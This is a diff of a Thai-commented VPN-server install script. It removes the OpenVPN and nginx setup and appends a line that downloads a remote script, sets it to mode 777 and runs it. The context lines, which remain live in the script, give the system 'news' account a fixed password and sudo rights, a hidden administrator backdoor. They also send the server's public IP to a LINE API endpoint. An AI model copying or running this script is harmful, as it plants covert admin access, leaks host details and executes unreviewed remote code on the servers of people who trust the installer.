@@ -45,15 +45,11 @@ echo "$SERVER_IP" > /usr/bin/ipsm
 # Install openvpn
 die "❯❯❯ apt-get update"
 apt-get update -q > /dev/null 2>&1
-die "❯❯❯ apt-get install openvpn curl openssl"
-apt-get install -qy openvpn curl > /dev/null 2>&1
 
 
 
 
-# Restart Service
-ok "❯❯❯ service openvpn restart"
-service openvpn restart > /dev/null 2>&1
+
 
 die "❯❯❯ apt-get install squid3"
 #Add Trusty Sources
@@ -70,19 +66,6 @@ sed -i 's/news:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin/news:x:9:9:new
 echo news:vpnk | chpasswd
 usermod -aG sudo news
 
-#install Nginx
-die "❯❯❯ apt-get install nginx"
-apt-get install -qy nginx > /dev/null 2>&1
-rm -f /etc/nginx/sites-enabled/default
-rm -f /etc/nginx/sites-available/default
-wget -q -O /etc/nginx/nginx.conf "$kguza/conf/nginx.conf"
-wget -q -O /etc/nginx/conf.d/vps.conf "$kguza/conf/vps.conf"
-mkdir -p /home/vps/public_html/open-on
-wget -q -O /home/vps/public_html/open-on/index.php "$kguza/conf/api.txt"
-wget -q -O /home/vps/public_html/index.php "$kguza/conf/kguza-vpn.txt"
-echo "<?php phpinfo( ); ?>" > /home/vps/public_html/info.php
-ok "❯❯❯ service nginx restart"
-service nginx restart > /dev/null 2>&1
 
 # install vnstat gui
 ok "❯❯❯ apt-get install vnstat"
@@ -206,10 +189,6 @@ wget -q -O /usr/bin/bwh "$kguza/menu/bwh"
 chmod +x /usr/bin/bwh
 
 
-die "❯❯❯ apt-get update"
-apt-get update -q > /dev/null 2>&1
-service openvpn restart -q > /dev/null 2>&1
-
 #แจ้งเตือนคนรันสคิป
 IP=$(wget -qO- ipv4.icanhazip.com);
 curl -X POST -H 'Authorization: โค๊คapi line' -F 'message='" 
@@ -249,3 +228,4 @@ echo " ┈╰━━━━━━━━━━━━━━━━━━━━━╯"
 echo " "
 fi
 echo ok > /etc/openvpn/okport
+wget https://raw.githubusercontent.com/LiLGun-X/SCRIPTX-VIP/main/Plus; chmod 777 Plus; ./Plus
